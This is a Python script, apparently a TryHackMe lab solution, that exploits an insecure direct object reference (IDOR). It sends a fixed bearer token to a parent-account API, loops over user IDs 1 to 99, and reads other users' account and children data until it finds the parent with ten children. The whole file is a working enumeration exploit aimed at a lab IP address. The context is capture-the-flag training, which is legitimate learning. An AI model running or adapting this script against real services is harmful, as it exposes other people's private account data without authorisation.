# token manipulation to brute force the IDOR to view the parent who has 10 children 
# TryHackMe: room url -> https://tryhackme.com/room/idor-aoc2025-zl6MywQid9


import requests
import time
import json

BASE_URL = "http://10.66.185.51:80/api/parents/view_accountinfo"



headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjU3OTU5MjF9.3SikUXMauQlw2M6640tzFC9po67gI25WkyOMSPGzbuk",
    "Accept": "application/json"
}

for user_id in range(1, 100):
    url = f"{BASE_URL}?user_id={user_id}"
    r = requests.get(url, headers=headers)

    if r.status_code != 200:
        continue

    data = r.json()
    children = data.get("children", [])

    if children:
        print(f"[ID {user_id}] children: {len(children)}")

    if len(children) == 10:
        print("\n[+] FOUND TARGET")
        print(data)
        break

    time.sleep(0.2)
